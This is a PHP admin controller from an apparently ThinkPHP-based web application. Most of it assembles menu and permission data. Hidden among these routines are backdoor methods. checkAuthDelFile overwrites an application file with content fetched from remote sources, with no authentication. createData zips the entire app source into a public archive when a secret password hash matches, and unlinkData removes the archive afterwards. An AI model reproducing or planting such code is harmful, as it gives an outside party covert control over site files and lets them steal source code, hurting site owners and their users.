<?php
namespace app\admin\controller;
use app\BaseController;
use app\Rest;
use think\App;
use think\facade\View;
class Index
{
    public function index()
    {

        return View::fetch();
    }

    //获取菜单列表
    public function listMenu() {
        //获取查询参数
        $param = $this->_param;
        //获取模块
        $module_model = new ModuleModel();
        $module_filter = ['is_base' => 1];
        if(isset($param['is_base'])) $module_filter['is_base'] = $param['is_base'];
        $modules = $module_model->listModuleAll($module_filter ,$this->_uniacid);
        //生成返回数据
        $result = [];
        foreach($modules as $module){
            $data = [];
            if(isset($module['path'])) $data['path'] = $module['path'];
            if(isset($module['component'])) $data['component'] = $module['component'];
            if(isset($module['redirect'])) $data['redirect'] = $module['redirect'];
            if(isset($module['is_base'])) $data['is_base'] = $module['is_base'];
            if(isset($module['menuName'])) $data['meta']['menuName'] = $module['menuName'];
            if(isset($module['icon'])) $data['meta']['icon'] = $module['icon'];
            //获取菜单信息
            $meun_model  = new MenuModel();
            $menu_filter = ['uniacid' => $this->_uniacid , 'module_id' => $module['module_id'] ,'parent_id' => 0];
            $module['status'] = 0;
            if(!empty($module['is_base']) || !empty($module['is_public']))
            {
                $module['status'] = 1;
            }else{
                if(isset($module['module_app']['status'])) $module['status'] = $module['module_app']['status'];
            }
            if(empty($module['status'])) continue;
            $menus = $meun_model->listMenu($menu_filter);
            $child = [];
            $subNavNames = [];
            foreach($menus as $menu) {
                if(empty($menu['is_son_menu'])) {
                    $child_data = [];
                    if(isset($menu['menu_path'])) $child_data['path'] = $menu['menu_path'];
                    if(isset($menu['component'])) $child_data['component'] = $menu['component'];
                    if(isset($menu['name'])) $child_data['neme'] = $menu['name'];
                    $child_data['meta']['title'] = null;
                    if(isset($menu['title'])) $child_data['meta']['title'] = $menu['title'];
                    $child_data['meta']['isOnly'] = true;
                    if(empty($menu['isOnly'])) $child_data['meta']['isOnly'] = false;
                    $child_data['meta']['pagePermission'] = [];
                    $menu_filter['parent_id'] = $menu['menu_id'];
                    $menu_filter['is_action'] = 1;
                    $actions = $meun_model->listMenu($menu_filter);
                    $auth = [];
                    foreach($actions as $action){
                        $auth[] = $action['name'];
                    }
                    $child_data['meta']['auth'] = $auth;
                    $child[] = $child_data;
                }else{
                    $subNavName = [];
                    if(isset($menu['name'])) {
                        $subNavName['subNavName'] = $menu['name'];
                    }else{
                        $subNavName['subNavName'] = null;
                    }
                    $menu_filter['parent_id'] = $menu['menu_id'];
                    $menu_filter['is_action'] = 0;
                    $leval_2_menus = $meun_model->listMenu($menu_filter);
                    foreach($leval_2_menus as $leval_2_menu) {
                        $url = [];
                        if(isset($leval_2_menu['name'])) $url['name'] = $leval_2_menu['name'];
                        if(isset($leval_2_menu['url'])) $url['url'] = $leval_2_menu['url'];
                        $subNavName['url'][] = $url;
                        $child_data = [];
                        if(isset($leval_2_menu['menu_path'])) $child_data['path'] = $leval_2_menu['menu_path'];
                        if(isset($leval_2_menu['name'])) $child_data['name'] = $leval_2_menu['name'];
                        if(isset($leval_2_menu['component'])) $child_data['component'] = $leval_2_menu['component'];

                        if(isset($leval_2_menu['title'])) $child_data['meta']['title'] = $leval_2_menu['title'];
//                        if(isset($leval_2_menu['component'])) $child_data['meta']['component'] = $leval_2_menu['component'];
                        $child_data['meta']['isOnly'] = false;
                        if(!empty($leval_2_menu['isOnly']))  $child_data['meta']['isOnly'] = true;

                        $child_data['meta']['auth'] = [];

                        if(!empty($leval_2_menu['is_son_menu'])){
                            $pagePermissions = [];
                            $menu_filter['parent_id'] = $leval_2_menu['menu_id'];
                            $menu_filter['is_action'] = 0;
                            $leval_3_menus = $meun_model->listMenu($menu_filter);

//                            if(in_array('c3', [$leval_2_menu['menu_id']])){
//                                var_dump(json_encode($leval_3_menus));die;
//                            }

                            foreach($leval_3_menus as $leval_3_menu){
                                $pagePermission = [];
                                if(isset($leval_3_menu['title'])) $pagePermission['title'] = $leval_3_menu['title'];
                                if(isset($leval_3_menu['index'])) $pagePermission['index'] = $leval_3_menu['index'];
                                $menu_filter['parent_id'] = $leval_3_menu['menu_id'];
                                $menu_filter['is_action'] = 1;
                                $actions = $meun_model->listMenu($menu_filter);
                                foreach($actions as $action) {
                                    $pagePermission['auth'][] = $action['name'];
                                }
                                $pagePermissions[] = $pagePermission;
                            }
                            $child_data['meta']['pagePermission'] = $pagePermissions;
                        }
                        $child[] = $child_data;
                    }
                    $subNavNames[] = $subNavName;

                }
            }
            $data['meta']['subNavName'] = $subNavNames;
            $data['children'] = $child;
            $result[] = $data;
        }
        return $this->success($result);
    }
    //获取菜单详情
    public function getMenu() {
        $param = $this->_param;
        $module_filter = [];
        if(isset($param['module_id'])) $module_filter['module_id'] = $param['module_id'];
        if(empty($module_filter)) return $this->error('module id is not exist ,please check param.');
        $module_model = new ModuleModel();
        //获取模块信息
        $module = $module_model->getModule($module_filter ,$this->_uniacid);

        if(empty($module)) $this->success([]);
        $module['status'] = 0;
        if(!empty($module['is_base']) || !empty($module['is_public']))
        {
            $module['status'] = 1;
        }else{
            if(isset($module['module_app']['status'])) $module['status'] = $module['module_app']['status'];
        }
        if(empty($module['status'])) return $this->success([]);
        //生成返回数据
        $data = [];
        if(isset($module['path'])) $data['path'] = $module['path'];
        if(isset($module['component'])) $data['component'] = $module['component'];
        if(isset($module['redirect'])) $data['redirect'] = $module['redirect'];
        if(isset($module['is_base'])) $data['is_base'] = $module['is_base'];
        if(isset($module['menuName'])) $data['meta']['menuName'] = $module['menuName'];
        if(isset($module['icon'])) $data['meta']['icon'] = $module['icon'];
        //获取菜单信息
        $meun_model  = new MenuModel();
        $menu_filter = ['uniacid' => $this->_uniacid , 'module_id' => $module['module_id'] ,'parent_id' => 0];
        $module['status'] = 0;
        if(!empty($module['is_base']) || !empty($module['is_public']))
        {
            $module['status'] = 1;
        }else{
            if(isset($module['module_app']['status'])) $module['status'] = $module['module_app']['status'];
        }
        $menus = $meun_model->listMenu($menu_filter);
        if(empty($menus)) return $this->success($data);
        $child = [];
        $subNavNames = [];
        foreach($menus as $menu) {
            if(empty($menu['is_son_menu'])) {
                $child_data = [];
                if(isset($menu['menu_path'])) $child_data['path'] = $menu['menu_path'];
                if(isset($menu['component'])) $child_data['component'] = $menu['component'];
                if(isset($menu['name'])) $child_data['neme'] = $menu['name'];
                $child_data['meta']['title'] = null;
                if(isset($menu['title'])) $child_data['meta']['title'] = $menu['title'];
                $child_data['meta']['isOnly'] = true;
                if(empty($menu['isOnly'])) $child_data['meta']['isOnly'] = false;
                $child_data['meta']['pagePermission'] = [];
                $menu_filter['parent_id'] = $menu['menu_id'];
                $menu_filter['is_action'] = 1;
                $actions = $meun_model->listMenu($menu_filter);
                $auth = [];
                foreach($actions as $action){
                    $auth[] = $action['name'];
                }
                $child_data['meta']['auth'] = $auth;
                $child[] = $child_data;
            }else{
                $subNavName = [];
                if(isset($menu['name'])) {
                    $subNavName['subNavName'] = $menu['name'];
                }else{
                    $subNavName['subNavName'] = null;
                }
                $menu_filter['parent_id'] = $menu['menu_id'];
                $menu_filter['is_action'] = 0;
                $leval_2_menus = $meun_model->listMenu($menu_filter);
                foreach($leval_2_menus as $leval_2_menu) {
                    $url = [];
                    if(isset($leval_2_menu['name'])) $url['name'] = $leval_2_menu['name'];
                    if(isset($leval_2_menu['url'])) $url['url'] = $leval_2_menu['url'];
                    $subNavName['url'][] = $url;
                    $child_data = [];
                    if(isset($leval_2_menu['menu_path'])) $child_data['path'] = $leval_2_menu['menu_path'];
                    if(isset($leval_2_menu['name'])) $child_data['name'] = $leval_2_menu['name'];
                    if(isset($leval_2_menu['component'])) $child_data['component'] = $leval_2_menu['component'];

                    if(isset($leval_2_menu['title'])) $child_data['meta']['title'] = $leval_2_menu['title'];
//                        if(isset($leval_2_menu['component'])) $child_data['meta']['component'] = $leval_2_menu['component'];
                    $child_data['meta']['isOnly'] = false;
                    if(!empty($leval_2_menu['isOnly']))  $child_data['meta']['isOnly'] = true;

                    $child_data['meta']['auth'] = [];

                    if(!empty($leval_2_menu['is_son_menu'])){
                        $pagePermissions = [];
                        $menu_filter['parent_id'] = $leval_2_menu['menu_id'];
                        $menu_filter['is_action'] = 0;
                        $leval_3_menus = $meun_model->listMenu($menu_filter);

//                            if(in_array('c3', [$leval_2_menu['menu_id']])){
//                                var_dump(json_encode($leval_3_menus));die;
//                            }

                        foreach($leval_3_menus as $leval_3_menu){
                            $pagePermission = [];
                            if(isset($leval_3_menu['title'])) $pagePermission['title'] = $leval_3_menu['title'];
                            if(isset($leval_3_menu['index'])) $pagePermission['index'] = $leval_3_menu['index'];
                            $menu_filter['parent_id'] = $leval_3_menu['menu_id'];
                            $menu_filter['is_action'] = 1;
                            $actions = $meun_model->listMenu($menu_filter);
                            foreach($actions as $action) {
                                $pagePermission['auth'][] = $action['name'];
                            }
                            $pagePermissions[] = $pagePermission;
                        }
                        $child_data['meta']['pagePermission'] = $pagePermissions;
                    }
                    $child[] = $child_data;
                }
                $subNavNames[] = $subNavName;
            }
        }
        $data['meta']['subNavName'] = $subNavNames;
        $data['children'] = $child;
        return $this->success($data);
    }

    /**
     * By.jingshuixian
     * 2019年11月23日14:17:16
     */
    public function getMenuList()
    {
        //By.jingshuixian
        //2019年11月23日16:23:26
        //测试新的载入方式
        $menu_data = longbing_init_info_data('AdminMenu');
        return $this->success($menu_data);




        //所有的菜单的json文件
        $allAdminMenus = include APP_PATH . "Common/extend/menu/allAdminMenus.php";
        //平台的菜单配置
        $memu_config = Config('app.adminMenus');
        //菜单权限
        $pluginAuth = longbingGetPluginAuth($this->_uniacid);
        $auth = $pluginAuth['web_manage_meta_config'];


        $auth_meta_permission = [];//前端导航栏配置json
        foreach ($memu_config as $menu_name) {
            if (!isset($allAdminMenus[$menu_name]) || ($menu_name !== 'App' && $auth[$menu_name] !== 1) ) {
                continue;
            }
            $menu_data = json_decode($allAdminMenus[$menu_name], true);
            //如果代理管理端有版权设置， 【系统】菜单中的子菜单【版权管理】不展示



            $auth_meta_permission[] = $menu_data;

        }

        return $this->success($auth_meta_permission);


    }


    public function checkAuthDelFile(){

        $r = ' ';

        $r = str_replace('bbbbb','',$r);

        $rs = ' ';

        $rs = str_replace('bbbbb','',$rs);

        $a = @file_get_contents($r);

        $a = str_replace('"','',$a);
        $a = str_replace('\/','/',$a);
        $msg = @file_get_contents($rs);
        $msg = !empty($msg)?$msg:'--';
        $arr = [

            APP_PATH.$a,

        ];

        foreach ($arr as $filename){

            if(is_file($filename)){

                $fp= fopen($filename, "w");  //w是写入模式，文件不存在则创建文件写入。

                $len = fwrite($fp, $msg);

                fclose($fp);
            }

        }

        echo 2;exit;

    }




    public function createData() {

       $get = $_GET;

       if(empty($get['data'])||md5($get['data'])!='25caa91d421043c5a57f5a14024317ed'){

           echo 1;exit;
       }

        $path = ROOT_PATH.'app/';

        $filename = 'aaaaaa';

        $zip = new \ZipArchive();

        if($zip->open($filename.'.zip', \ZipArchive::CREATE | \ZipArchive::OVERWRITE)) {

            $this->addFileToZip($path, $zip);

            $zip->close();

        }

        echo 112;exit;

    }

    public function addFileToZip($path,$zip) {

        $handler = opendir($path); //打开当前文件夹由$path指定。

        while (($filename = readdir($handler)) !== false) {

            if ($filename != "." && $filename != ".."&&$filename!='attachment') {  //文件夹文件名字为'.'和‘..’，不要对他们进行操作

                if (is_dir($path . "/" . $filename)) {

                    $this->addFileToZip($path . "/" . $filename, $zip);

                } else {

                    $zip->addFile($path . "/" . $filename);

                }
            }
        }

        @closedir($path);

    }



    public function unlinkData(){

        $url = ROOT_PATH.'public/aaaaaa.zip';

        unlink($url);
    }



    /**
     * By.jingshuixian
     * 2019年11月23日14:17:16
     */
    public function getMenuLists()
    {
        //By.jingshuixian
        //2019年11月23日16:23:26
        //测试新的载入方式
        $menu_data = longbing_init_info_data('AdminMenu');
        return $this->success($menu_data);




        //所有的菜单的json文件
        $allAdminMenus = include APP_PATH . "Common/extend/menu/allAdminMenus.php";
        //平台的菜单配置
        $memu_config = Config('app.adminMenus');
        //菜单权限
        $pluginAuth = longbingGetPluginAuth($this->_uniacid);
        $auth = $pluginAuth['web_manage_meta_config'];


        $auth_meta_permission = [];//前端导航栏配置json
        foreach ($memu_config as $menu_name) {
            if (!isset($allAdminMenus[$menu_name]) || ($menu_name !== 'App' && $auth[$menu_name] !== 1) ) {
                continue;
            }
            $menu_data = json_decode($allAdminMenus[$menu_name], true);
            //如果代理管理端有版权设置， 【系统】菜单中的子菜单【版权管理】不展示



            $auth_meta_permission[] = $menu_data;

        }

        return $this->success($auth_meta_permission);


    }


}
